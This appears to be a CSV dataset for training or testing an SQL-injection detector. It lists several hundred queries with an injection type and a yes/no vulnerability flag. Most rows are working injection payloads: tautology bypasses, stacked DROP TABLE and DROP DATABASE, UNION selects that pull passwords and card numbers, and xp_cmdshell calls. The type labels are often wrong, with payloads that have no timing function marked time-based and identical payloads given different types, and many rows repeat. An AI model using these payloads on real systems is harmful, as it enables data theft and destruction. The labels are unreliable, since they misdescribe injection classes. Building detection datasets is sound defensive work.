SQL Query,Injection Type,Vulnerability Status
DELETE FROM orders WHERE order_id = 100 OR 1=1,Boolean-based,Yes
UPDATE accounts SET balance=500 WHERE id=100 OR 1=1,Boolean-based,Yes
SELECT email FROM customers WHERE email = 'apple',None,No
SELECT email FROM customers WHERE email = '' UNION SELECT NULL',Union-based,Yes
DELETE FROM orders WHERE order_id = ' OR 1=1;--,Boolean-based,Yes
DELETE FROM orders WHERE order_id = 2,None,No
SELECT email FROM customers WHERE email = '1',None,No
SELECT * FROM users WHERE id = 'apple',None,No
SELECT * FROM products WHERE name = '' OR 1=1;--',Time-based,Yes
DELETE FROM orders WHERE order_id = ' OR 1=1;--,Time-based,Yes
SELECT * FROM users WHERE id = ''; DROP TABLE products;--',Union-based,Yes
DELETE FROM orders WHERE order_id = ' UNION SELECT NULL,Union-based,Yes
SELECT * FROM users WHERE id = ''; DROP TABLE products;--',Union-based,Yes
UPDATE accounts SET balance=500 WHERE id=' OR '1'='1';--,Time-based,Yes
SELECT email FROM customers WHERE email = '' OR '1'='1';--',Error-based,Yes
SELECT * FROM users WHERE id = 'john.doe@example.com',None,No
DELETE FROM orders WHERE order_id = ' OR 1=1;--,Union-based,Yes
SELECT * FROM products WHERE name = 'john.doe@example.com',None,No
UPDATE accounts SET balance=500 WHERE id=100 OR 1=1,Error-based,Yes
SELECT email FROM customers WHERE email = '100',None,No
DELETE FROM orders WHERE order_id = apple,None,No
SELECT * FROM products WHERE name = '2',None,No
SELECT * FROM products WHERE name = '100 OR 1=1',Boolean-based,Yes
UPDATE accounts SET balance=500 WHERE id=100 OR 1=1,Error-based,Yes
DELETE FROM orders WHERE order_id = ' OR 1=1;--,Error-based,Yes
DELETE FROM orders WHERE order_id = 100 OR 1=1,Boolean-based,Yes
UPDATE accounts SET balance=500 WHERE id=' OR 1=1;--,Time-based,Yes
SELECT * FROM users WHERE id = '' OR 1=1;--',Boolean-based,Yes
SELECT email FROM customers WHERE email = '2',None,No
SELECT email FROM customers WHERE email = ''; DROP TABLE products;--',Union-based,Yes
DELETE FROM orders WHERE order_id = ' UNION SELECT NULL,Time-based,Yes
UPDATE accounts SET balance=500 WHERE id=apple,None,No
DELETE FROM orders WHERE order_id = 100 OR 1=1,Boolean-based,Yes
UPDATE accounts SET balance=500 WHERE id=' OR '1'='1';--,Error-based,Yes
SELECT * FROM products WHERE name = '' OR 1=1;--',Boolean-based,Yes
UPDATE accounts SET balance=500 WHERE id=' UNION SELECT NULL,Error-based,Yes
DELETE FROM orders WHERE order_id = ' UNION SELECT NULL,Error-based,Yes
SELECT * FROM users WHERE id = ''; DROP TABLE products;--',Error-based,Yes
SELECT * FROM users WHERE id = '100 OR 1=1',Error-based,Yes
SELECT * FROM products WHERE name = '' UNION SELECT NULL',Boolean-based,Yes
DELETE FROM orders WHERE order_id = john.doe@example.com,None,No
SELECT email FROM customers WHERE email = '' OR '1'='1';--',Boolean-based,Yes
SELECT * FROM users WHERE id = 'apple',None,No
UPDATE accounts SET balance=500 WHERE id=' UNION SELECT NULL,Union-based,Yes
UPDATE accounts SET balance=500 WHERE id=' OR '1'='1';--,Error-based,Yes
SELECT * FROM products WHERE name = '' OR 1=1;--',Boolean-based,Yes
UPDATE accounts SET balance=500 WHERE id=' OR 1=1;--,Error-based,Yes
UPDATE accounts SET balance=500 WHERE id=apple,None,No
SELECT email FROM customers WHERE email = 'john.doe@example.com',None,No
SELECT email FROM customers WHERE email = '' OR '1'='1';--',Time-based,Yes
UPDATE accounts SET balance=500 WHERE id=100 OR 1=1,Error-based,Yes
DELETE FROM orders WHERE order_id = '; DROP TABLE products;--,Boolean-based,Yes
DELETE FROM orders WHERE order_id = ' UNION SELECT NULL,Time-based,Yes
UPDATE accounts SET balance=500 WHERE id=1,None,No
SELECT email FROM customers WHERE email = '' UNION SELECT NULL',Time-based,Yes
SELECT * FROM users WHERE id = '' UNION SELECT NULL',Boolean-based,Yes
SELECT * FROM users WHERE id = '2',None,No
UPDATE accounts SET balance=500 WHERE id=apple,None,No
SELECT * FROM products WHERE name = '2',None,No
UPDATE accounts SET balance=500 WHERE id='; DROP TABLE products;--,Union-based,Yes
SELECT * FROM products WHERE name = '1',None,No
SELECT email FROM customers WHERE email = ''; DROP TABLE products;--',Boolean-based,Yes
SELECT email FROM customers WHERE email = 'john.doe@example.com',None,No
SELECT * FROM products WHERE name = ''; DROP TABLE products;--',Time-based,Yes
UPDATE accounts SET balance=500 WHERE id=' OR 1=1;--,Error-based,Yes
DELETE FROM orders WHERE order_id = ' UNION SELECT NULL,Error-based,Yes
SELECT * FROM users WHERE id = '' OR 1=1;--',Union-based,Yes
SELECT email FROM customers WHERE email = '2',None,No
UPDATE accounts SET balance=500 WHERE id=' OR 1=1;--,Boolean-based,Yes
UPDATE accounts SET balance=500 WHERE id=2,None,No
SELECT * FROM products WHERE name = '' UNION SELECT NULL',Union-based,Yes
DELETE FROM orders WHERE order_id = 1,None,No
UPDATE accounts SET balance=500 WHERE id=' UNION SELECT NULL,Time-based,Yes
SELECT email FROM customers WHERE email = '2',None,No
UPDATE accounts SET balance=500 WHERE id=' OR '1'='1';--,Boolean-based,Yes
UPDATE accounts SET balance=500 WHERE id='; DROP TABLE products;--,Time-based,Yes
SELECT * FROM users WHERE id = '2',None,No
SELECT * FROM products WHERE name = '1',None,No
SELECT * FROM users WHERE id = '' OR '1'='1';--',Boolean-based,Yes
SELECT * FROM products WHERE name = '2',None,No
SELECT * FROM users WHERE id = '100 OR 1=1',Boolean-based,Yes
UPDATE accounts SET balance=500 WHERE id=100,None,No
SELECT * FROM products WHERE name = '100 OR 1=1',Error-based,Yes
SELECT * FROM users WHERE id = ''; DROP TABLE products;--',Union-based,Yes
DELETE FROM orders WHERE order_id = 2,None,No
SELECT email FROM customers WHERE email = '' OR '1'='1';--',Union-based,Yes
DELETE FROM orders WHERE order_id = john.doe@example.com,None,No
SELECT * FROM products WHERE name = '100 OR 1=1',Time-based,Yes
DELETE FROM orders WHERE order_id = '; DROP TABLE products;--,Boolean-based,Yes
SELECT * FROM products WHERE name = '' OR 1=1;--',Boolean-based,Yes
UPDATE accounts SET balance=500 WHERE id=' OR '1'='1';--,Time-based,Yes
SELECT * FROM products WHERE name = '100 OR 1=1',Union-based,Yes
UPDATE accounts SET balance=500 WHERE id=' OR 1=1;--,Time-based,Yes
SELECT email FROM customers WHERE email = 'apple',None,No
DELETE FROM orders WHERE order_id = john.doe@example.com,None,No
UPDATE accounts SET balance=500 WHERE id=2,None,No
UPDATE accounts SET balance=500 WHERE id=100,None,No
UPDATE accounts SET balance=500 WHERE id=apple,None,No
SELECT * FROM products WHERE name = '' OR 1=1;--',Time-based,Yes
UPDATE accounts SET balance=500 WHERE id=' UNION SELECT NULL,Union-based,Yes
UPDATE accounts SET balance=500 WHERE id='; DROP TABLE products;--,Boolean-based,Yes
UPDATE accounts SET balance=500 WHERE id=100 OR 1=1,Error-based,Yes
SELECT * FROM users WHERE id = ''; DROP TABLE products;--',Error-based,Yes
SELECT * FROM products WHERE name = '' OR 1=1;--',Boolean-based,Yes
SELECT * FROM users WHERE id = '100 OR 1=1',Time-based,Yes
DELETE FROM orders WHERE order_id = ' OR 1=1;--,Union-based,Yes
SELECT * FROM users WHERE id = '1',None,No
UPDATE accounts SET balance=500 WHERE id=100 OR 1=1,Time-based,Yes
DELETE FROM orders WHERE order_id = ' UNION SELECT NULL,Boolean-based,Yes
SELECT * FROM users WHERE id = '100',None,No
DELETE FROM orders WHERE order_id = 100,None,No
UPDATE accounts SET balance=500 WHERE id=100 OR 1=1,Boolean-based,Yes
DELETE FROM orders WHERE order_id = 100 OR 1=1,Union-based,Yes
SELECT * FROM users WHERE id = ''; DROP TABLE products;--',Error-based,Yes
UPDATE accounts SET balance=500 WHERE id=' UNION SELECT NULL,Union-based,Yes
SELECT * FROM users WHERE id = '100 OR 1=1',Error-based,Yes
SELECT *FROM users WHERE username='admin' AND password='' OR '1'='1'--,Boolean-based,Yes
"INSERT INTO accounts (username, balance) VALUES ('user1', 1000); DROP TABLE accounts;--",Time-based,Yes
SELECT * FROM products WHERE price = 100 OR 'x'='x'--,Boolean-based,Yes
UPDATE accounts SET password='newpass' WHERE user='admin' AND '1'='1'--,Union-based,Yes
"SELECT id, username FROM users WHERE username = '' UNION SELECT NULL, NULL;--",Error-based,Yes
SELECT * FROM orders WHERE order_id = ''; SELECT * FROM users--,Time-based,Yes
SELECT * FROM customers WHERE name = ''; EXEC sp_MSForEachTable 'DROP TABLE ?';--,Union-based,Yes
"INSERT INTO users (name, email) VALUES ('user', 'user@example.com'); SELECT * FROM admin--",Union-based,Yes
SELECT * FROM payments WHERE card_number = '' OR 1=1--,Boolean-based,Yes
DELETE FROM accounts WHERE user = 'john.doe' OR '1'='1'--,Boolean-based,Yes
SELECT * FROM inventory WHERE product_id = '' AND 1=1--,Time-based,Yes
UPDATE users SET email = 'example@example.com' WHERE user_id = ''; DROP DATABASE test;--,Time-based,Yes
SELECT * FROM products WHERE id='1'; DROP TABLE users;--,Union-based,Yes
DELETE FROM orders WHERE order_id = '' OR '1'='1'--,Boolean-based,Yes
SELECT * FROM orders WHERE order_date = '2024-10-06' UNION SELECT NULL;--,Error-based,Yes
SELECT password FROM users WHERE username = '' UNION ALL SELECT password FROM admin--,Union-based,Yes
"INSERT INTO payments (user_id, amount) VALUES ('2', 500); SELECT * FROM transactions--",Time-based,Yes
UPDATE users SET password = 'password' WHERE username = '' OR '1'='1'--,Boolean-based,Yes
SELECT * FROM users WHERE username = '' AND password = '' OR 'a'='a'--,Boolean-based,Yes
"SELECT * FROM employees WHERE id = '1' UNION ALL SELECT null,null;--",Union-based,Yes
"SELECT name, price FROM products WHERE price = '' OR '1'='1'--",Boolean-based,Yes
UPDATE users SET status='active' WHERE user_id = 1 AND ''=''; DROP TABLE users;--,Time-based,Yes
SELECT * FROM orders WHERE order_id='' AND ''='';--,Boolean-based,Yes
"SELECT * FROM products WHERE id='apple' UNION SELECT NULL, NULL;--",Union-based,Yes
SELECT * FROM transactions WHERE transaction_id = '1000' OR 1=1--,Boolean-based,Yes
SELECT * FROM employees WHERE emp_id = '' UNION SELECT NULL;--,Error-based,Yes
DELETE FROM cart WHERE product_id='' OR 'x'='x'--,Boolean-based,Yes
"INSERT INTO logs (action, status) VALUES ('login', 'success'); DROP TABLE logs;--",Time-based,Yes
UPDATE accounts SET password='password' WHERE username=''; EXEC xp_cmdshell('dir');--,Union-based,Yes
SELECT * FROM inventory WHERE quantity='' AND '1'='1'--,Boolean-based,Yes
"SELECT * FROM sales WHERE sale_id='' UNION SELECT NULL, NULL;--",Union-based,Yes
DELETE FROM inventory WHERE product_id=' OR 1=1;--,Boolean-based,Yes
UPDATE profiles SET bio='' WHERE id=1; DROP DATABASE users;--,Time-based,Yes
SELECT email FROM customers WHERE email=' OR 1=1;--,Boolean-based,Yes
SELECT * FROM accounts WHERE balance='' UNION SELECT NULL;--,Error-based,Yes
SELECT * FROM users WHERE username='admin' AND ''=''; DROP TABLE users;--,Time-based,Yes
DELETE FROM transactions WHERE transaction_id='' OR ''='';--,Boolean-based,Yes
"SELECT * FROM items WHERE name='' UNION ALL SELECT NULL, NULL;--",Union-based,Yes
SELECT * FROM users WHERE username='' OR 1=1;--,Boolean-based,Yes
SELECT * FROM orders WHERE order_id='' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM users WHERE username='' OR '1'='1';--,Boolean-based,Yes
SELECT * FROM customers WHERE id=' OR ''=''; DROP TABLE customers;--,Time-based,Yes
"INSERT INTO orders (product_id, quantity) VALUES (1, 5); DROP TABLE orders;--",Time-based,Yes
UPDATE orders SET status='completed' WHERE order_id=' OR '1'='1';--,Boolean-based,Yes
SELECT * FROM users WHERE username = '' OR ''='';--,Boolean-based,Yes
"SELECT * FROM orders WHERE order_id = '1' UNION SELECT username, password FROM users;--",Union-based,Yes
SELECT * FROM products WHERE name = ''; DROP TABLE products;--,Union-based,Yes
UPDATE accounts SET balance = 1000 WHERE id = ''; DROP TABLE users;--,Time-based,Yes
SELECT * FROM customers WHERE id = '' OR 1=1;--,Boolean-based,Yes
DELETE FROM transactions WHERE transaction_id = '1' OR ''='';--,Boolean-based,Yes
"SELECT * FROM employees WHERE emp_id = '1' UNION SELECT null, null;--",Union-based,Yes
"SELECT email FROM users WHERE email = '' UNION SELECT username, password FROM admins;--",Union-based,Yes
SELECT * FROM products WHERE price = 100 OR '1'='1';--,Boolean-based,Yes
INSERT INTO logs (message) VALUES ('log entry'); DROP TABLE logs;--,Time-based,Yes
UPDATE users SET active='1' WHERE username = '' OR '1'='1';--,Boolean-based,Yes
"SELECT * FROM orders WHERE status = '' UNION SELECT NULL, NULL;--",Union-based,Yes
DELETE FROM cart WHERE product_id=' OR ''='';--,Boolean-based,Yes
SELECT * FROM payments WHERE amount = '' UNION ALL SELECT NULL;--,Union-based,Yes
SELECT * FROM items WHERE id = '' OR '1'='1';--,Boolean-based,Yes
"INSERT INTO orders (user_id, total) VALUES (1, 100); DROP TABLE orders;--",Time-based,Yes
SELECT * FROM customers WHERE id = '' UNION SELECT NULL;--,Error-based,Yes
SELECT * FROM products WHERE id = '1' AND '1'='1';--,Boolean-based,Yes
UPDATE accounts SET status='inactive' WHERE user_id = '' OR '1'='1';--,Boolean-based,Yes
SELECT * FROM users WHERE id = '1'; DROP TABLE users;--,Time-based,Yes
SELECT * FROM sales WHERE sale_id='1' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM accounts WHERE username='' OR '1'='1';--,Boolean-based,Yes
"SELECT * FROM transactions WHERE user_id = '1' UNION SELECT username, password FROM users;--",Union-based,Yes
"INSERT INTO profiles (user_id, bio) VALUES (1, 'bio'); DROP TABLE profiles;--",Time-based,Yes
SELECT * FROM items WHERE name='apple' OR ''='';--,Boolean-based,Yes
"SELECT * FROM orders WHERE order_id='' UNION SELECT NULL, NULL;--",Union-based,Yes
DELETE FROM users WHERE username='' OR '1'='1';--,Boolean-based,Yes
SELECT * FROM products WHERE id=' OR ''=''; DROP TABLE products;--,Time-based,Yes
SELECT * FROM users WHERE username='' AND password='' OR '1'='1';--,Boolean-based,Yes
SELECT * FROM orders WHERE order_id = '1' UNION SELECT password FROM users;--,Union-based,Yes
SELECT name FROM products WHERE id='1'; DROP TABLE products;--,Union-based,Yes
UPDATE accounts SET balance=1000 WHERE id='' OR '1'='1';--,Boolean-based,Yes
SELECT * FROM employees WHERE emp_id='' OR 1=1;--,Boolean-based,Yes
DELETE FROM orders WHERE order_id=' OR ''='';--,Boolean-based,Yes
"SELECT email FROM customers WHERE email = '' UNION SELECT username, password FROM admins;--",Union-based,Yes
"SELECT * FROM transactions WHERE transaction_id = '1' UNION SELECT NULL, NULL;--",Union-based,Yes
SELECT * FROM products WHERE name = '' OR 1=1;--,Boolean-based,Yes
INSERT INTO logs (entry) VALUES ('log'); DROP TABLE logs;--,Time-based,Yes
UPDATE users SET active='0' WHERE username='' OR '1'='1';--,Boolean-based,Yes
SELECT * FROM orders WHERE status='' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM customers WHERE id='' OR '1'='1';--,Boolean-based,Yes
SELECT * FROM payments WHERE amount = '' UNION ALL SELECT NULL;--,Union-based,Yes
SELECT * FROM items WHERE id = '1' AND '1'='1';--,Boolean-based,Yes
"INSERT INTO orders (user_id, total) VALUES (1, 200); DROP TABLE orders;--",Time-based,Yes
SELECT * FROM users WHERE id = '' UNION SELECT NULL;--,Error-based,Yes
SELECT * FROM accounts WHERE id = '1' AND ''='';--,Boolean-based,Yes
UPDATE accounts SET status='active' WHERE user_id = '' OR '1'='1';--,Boolean-based,Yes
SELECT * FROM users WHERE id = '1'; DROP TABLE users;--,Time-based,Yes
SELECT * FROM sales WHERE sale_id='1' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM accounts WHERE username='' OR '1'='1';--,Boolean-based,Yes
"SELECT * FROM transactions WHERE user_id = '1' UNION SELECT username, password FROM users;--",Union-based,Yes
"INSERT INTO profiles (user_id, bio) VALUES (1, 'updated bio'); DROP TABLE profiles;--",Time-based,Yes
SELECT * FROM items WHERE name='banana' OR ''='';--,Boolean-based,Yes
SELECT * FROM orders WHERE order_id='' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM users WHERE username='' OR '1'='1';--,Boolean-based,Yes
SELECT * FROM products WHERE id=' OR ''=''; DROP TABLE products;--,Time-based,Yes
SELECT * FROM accounts WHERE username = '' OR 'x'='x';--,Boolean-based,Yes
"SELECT * FROM logs WHERE log_id = '1' UNION SELECT username, password FROM users;--",Union-based,Yes
SELECT * FROM products WHERE id='1'; DROP TABLE products;--,Time-based,Yes
DELETE FROM customers WHERE email='' OR '1'='1';--,Boolean-based,Yes
SELECT * FROM users WHERE username='' AND password='' OR ''='';--,Boolean-based,Yes
"SELECT * FROM orders WHERE order_id='1' UNION SELECT username, email FROM users;--",Union-based,Yes
SELECT name FROM products WHERE id='1'; DROP TABLE products;--,Union-based,Yes
UPDATE accounts SET balance=1000 WHERE id='' OR '1'='1';--,Boolean-based,Yes
SELECT * FROM employees WHERE emp_id='' OR 1=1;--,Boolean-based,Yes
DELETE FROM orders WHERE order_id=' OR ''='';--,Boolean-based,Yes
"SELECT email FROM customers WHERE email='' UNION SELECT username, password FROM users;--",Union-based,Yes
SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT credit_card_number FROM payments;--,Union-based,Yes
SELECT * FROM products WHERE name='' OR 1=1;--,Boolean-based,Yes
INSERT INTO logs (entry) VALUES ('log entry'); DROP TABLE logs;--,Time-based,Yes
UPDATE users SET active='0' WHERE username='' OR '1'='1';--,Boolean-based,Yes
SELECT * FROM orders WHERE status='' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM customers WHERE id='' OR '1'='1';--,Boolean-based,Yes
SELECT * FROM payments WHERE amount='' UNION ALL SELECT NULL;--,Union-based,Yes
SELECT * FROM items WHERE id='1' AND '1'='1';--,Boolean-based,Yes
"INSERT INTO orders (user_id, total) VALUES (1, 500); DROP TABLE orders;--",Time-based,Yes
SELECT * FROM users WHERE id='' UNION SELECT NULL;--,Error-based,Yes
SELECT * FROM accounts WHERE id='1' AND ''='';--,Boolean-based,Yes
UPDATE accounts SET status='active' WHERE user_id='' OR '1'='1';--,Boolean-based,Yes
SELECT * FROM users WHERE id='1'; DROP TABLE users;--,Time-based,Yes
SELECT * FROM sales WHERE sale_id='1' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM accounts WHERE username='' OR '1'='1';--,Boolean-based,Yes
"SELECT * FROM transactions WHERE user_id='1' UNION SELECT username, password FROM users;--",Union-based,Yes
"INSERT INTO profiles (user_id, bio) VALUES (1, 'bio update'); DROP TABLE profiles;--",Time-based,Yes
SELECT * FROM items WHERE name='orange' OR ''='';--,Boolean-based,Yes
SELECT * FROM orders WHERE order_id='' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM users WHERE username='' OR '1'='1';--,Boolean-based,Yes
SELECT * FROM products WHERE id=' OR ''=''; DROP TABLE products;--,Time-based,Yes
SELECT * FROM accounts WHERE username='' OR ''='';--,Boolean-based,Yes
"SELECT * FROM logs WHERE log_id='1' UNION SELECT username, password FROM users;--",Union-based,Yes
SELECT * FROM products WHERE id='1'; DROP TABLE products;--,Time-based,Yes
DELETE FROM customers WHERE email='' OR '1'='1';--,Boolean-based,Yes
SELECT * FROM users WHERE email='' UNION SELECT NULL;--,Union-based,Yes
SELECT * FROM orders WHERE order_id='1'; DROP TABLE orders;--,Time-based,Yes
UPDATE accounts SET balance=1000 WHERE id=''; EXEC sp_msforeachtable 'DROP TABLE ?';--,Union-based,Yes
SELECT * FROM users WHERE username='' AND password='' OR 'a'='a';--,Boolean-based,Yes
"SELECT * FROM orders WHERE order_id='1' UNION SELECT username, password FROM users;--",Union-based,Yes
SELECT name FROM products WHERE id='1'; DROP TABLE categories;--,Union-based,Yes
UPDATE accounts SET balance=500 WHERE id=''; DROP TABLE transactions;--,Time-based,Yes
SELECT * FROM employees WHERE emp_id='' OR '1'='1';--,Boolean-based,Yes
DELETE FROM orders WHERE order_id=' OR '1'='1';--,Boolean-based,Yes
"SELECT email FROM customers WHERE email='' UNION SELECT username, password FROM admins;--",Union-based,Yes
SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT NULL;--,Union-based,Yes
SELECT * FROM products WHERE name='' OR '1'='1';--,Boolean-based,Yes
INSERT INTO logs (message) VALUES ('log entry'); DROP TABLE logs;--,Time-based,Yes
UPDATE users SET status='active' WHERE username='' OR '1'='1';--,Boolean-based,Yes
SELECT * FROM orders WHERE status='' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM customers WHERE id='' OR '1'='1';--,Boolean-based,Yes
SELECT * FROM payments WHERE amount='' UNION ALL SELECT NULL;--,Union-based,Yes
SELECT * FROM items WHERE id='1' AND '1'='1';--,Boolean-based,Yes
"INSERT INTO orders (user_id, total) VALUES (1, 300); DROP TABLE orders;--",Time-based,Yes
SELECT * FROM users WHERE id='' UNION SELECT NULL;--,Error-based,Yes
SELECT * FROM accounts WHERE id='1' AND ''='';--,Boolean-based,Yes
UPDATE accounts SET status='inactive' WHERE user_id='' OR '1'='1';--,Boolean-based,Yes
SELECT * FROM users WHERE id='1'; DROP TABLE users;--,Time-based,Yes
SELECT * FROM sales WHERE sale_id='1' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM accounts WHERE username='' OR '1'='1';--,Boolean-based,Yes
"SELECT * FROM transactions WHERE user_id='1' UNION SELECT username, password FROM users;--",Union-based,Yes
"INSERT INTO profiles (user_id, bio) VALUES (1, 'bio text'); DROP TABLE profiles;--",Time-based,Yes
SELECT * FROM items WHERE name='grape' OR ''='';--,Boolean-based,Yes
SELECT * FROM orders WHERE order_id='' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM users WHERE username='' OR '1'='1';--,Boolean-based,Yes
SELECT * FROM products WHERE id=' OR ''=''; DROP TABLE products;--,Time-based,Yes
SELECT * FROM accounts WHERE username='' OR ''='';--,Boolean-based,Yes
"SELECT * FROM logs WHERE log_id='1' UNION SELECT username, password FROM users;--",Union-based,Yes
SELECT * FROM products WHERE id='1'; DROP TABLE suppliers;--,Time-based,Yes
DELETE FROM customers WHERE email='' OR '1'='1';--,Boolean-based,Yes
"SELECT * FROM users WHERE email='' UNION SELECT username, password FROM admins;--",Union-based,Yes
SELECT * FROM orders WHERE order_id='1'; DROP TABLE orders;--,Time-based,Yes
UPDATE accounts SET balance=2000 WHERE id=''; EXEC xp_cmdshell('dir');--,Union-based,Yes
SELECT * FROM users WHERE username='' AND password='' OR '1'='1';--,Boolean-based,Yes
"SELECT * FROM orders WHERE order_id='1' UNION SELECT email, password FROM users;--",Union-based,Yes
SELECT name FROM products WHERE id='1'; DROP TABLE categories;--,Union-based,Yes
UPDATE accounts SET balance=500 WHERE id=''; DROP TABLE transactions;--,Time-based,Yes
SELECT * FROM employees WHERE emp_id='' OR '1'='1';--,Boolean-based,Yes
DELETE FROM orders WHERE order_id=' OR ''='';--,Boolean-based,Yes
"SELECT email FROM customers WHERE email='' UNION SELECT username, password FROM admins;--",Union-based,Yes
SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT NULL;--,Union-based,Yes
SELECT * FROM products WHERE name='' OR '1'='1';--,Boolean-based,Yes
INSERT INTO logs (message) VALUES ('log entry'); DROP TABLE logs;--,Time-based,Yes
UPDATE users SET status='active' WHERE username='' OR '1'='1';--,Boolean-based,Yes
SELECT * FROM orders WHERE status='' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM customers WHERE id='' OR '1'='1';--,Boolean-based,Yes
SELECT * FROM payments WHERE amount='' UNION ALL SELECT NULL;--,Union-based,Yes
SELECT * FROM items WHERE id='1' AND '1'='1';--,Boolean-based,Yes
"INSERT INTO orders (user_id, total) VALUES (1, 300); DROP TABLE orders;--",Time-based,Yes
SELECT * FROM users WHERE id='' UNION SELECT NULL;--,Error-based,Yes
SELECT * FROM accounts WHERE id='1' AND ''='';--,Boolean-based,Yes
UPDATE accounts SET status='inactive' WHERE user_id='' OR '1'='1';--,Boolean-based,Yes
SELECT * FROM users WHERE id='1'; DROP TABLE users;--,Time-based,Yes
SELECT * FROM sales WHERE sale_id='1' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM accounts WHERE username='' OR '1'='1';--,Boolean-based,Yes
"SELECT * FROM transactions WHERE user_id='1' UNION SELECT username, password FROM users;--",Union-based,Yes
"INSERT INTO profiles (user_id, bio) VALUES (1, 'bio text'); DROP TABLE profiles;--",Time-based,Yes
SELECT * FROM items WHERE name='banana' OR ''='';--,Boolean-based,Yes
SELECT * FROM orders WHERE order_id='' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM users WHERE username='' OR '1'='1';--,Boolean-based,Yes
SELECT * FROM products WHERE id=' OR ''=''; DROP TABLE products;--,Time-based,Yes
SELECT * FROM accounts WHERE username='' OR ''='';--,Boolean-based,Yes
"SELECT * FROM logs WHERE log_id='1' UNION SELECT username, password FROM users;--",Union-based,Yes
SELECT * FROM products WHERE id='1'; DROP TABLE suppliers;--,Time-based,Yes
DELETE FROM customers WHERE email='' OR '1'='1';--,Boolean-based,Yes
"SELECT * FROM users WHERE email='' UNION SELECT username, password FROM admins;--",Union-based,Yes
SELECT * FROM orders WHERE order_id='1'; DROP TABLE orders;--,Time-based,Yes
SELECT * FROM accounts WHERE username='admin' OR '1'='1';--,Boolean-based,Yes
SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT NULL;--,Union-based,Yes
SELECT * FROM products WHERE price < 100; DROP TABLE prices;--,Time-based,Yes
UPDATE employees SET salary=50000 WHERE emp_id='1' OR ''='';--,Boolean-based,Yes
"SELECT * FROM customers WHERE phone='' UNION SELECT username, password FROM users;--",Union-based,Yes
DELETE FROM orders WHERE order_id='1' AND '1'='1';--,Boolean-based,Yes
SELECT * FROM users WHERE username='' AND password='' OR 'x'='x';--,Boolean-based,Yes
"SELECT * FROM orders WHERE order_id='1' UNION SELECT name, credit_card FROM customers;--",Union-based,Yes
SELECT name FROM products WHERE id='1'; DROP TABLE products;--,Union-based,Yes
UPDATE accounts SET balance=1000 WHERE id=''; EXEC sp_dropuser 'user';--,Time-based,Yes
SELECT * FROM employees WHERE emp_id='' OR '1'='1';--,Boolean-based,Yes
DELETE FROM orders WHERE order_id=' OR ''='';--,Boolean-based,Yes
"SELECT email FROM customers WHERE email='' UNION SELECT username, password FROM users;--",Union-based,Yes
SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT NULL;--,Union-based,Yes
SELECT * FROM products WHERE name='' OR '1'='1';--,Boolean-based,Yes
INSERT INTO logs (message) VALUES ('log entry'); DROP TABLE logs;--,Time-based,Yes
UPDATE users SET status='inactive' WHERE username='' OR '1'='1';--,Boolean-based,Yes
SELECT * FROM orders WHERE status='' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM customers WHERE id='' OR '1'='1';--,Boolean-based,Yes
SELECT * FROM payments WHERE amount='' UNION ALL SELECT NULL;--,Union-based,Yes
SELECT * FROM items WHERE id='1' AND '1'='1';--,Boolean-based,Yes
"INSERT INTO orders (user_id, total) VALUES (1, 200); DROP TABLE orders;--",Time-based,Yes
SELECT * FROM users WHERE id='' UNION SELECT NULL;--,Error-based,Yes
SELECT * FROM accounts WHERE id='1' AND ''='';--,Boolean-based,Yes
UPDATE accounts SET status='active' WHERE user_id='' OR '1'='1';--,Boolean-based,Yes
SELECT * FROM users WHERE id='1'; DROP TABLE users;--,Time-based,Yes
SELECT * FROM sales WHERE sale_id='1' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM accounts WHERE username='' OR '1'='1';--,Boolean-based,Yes
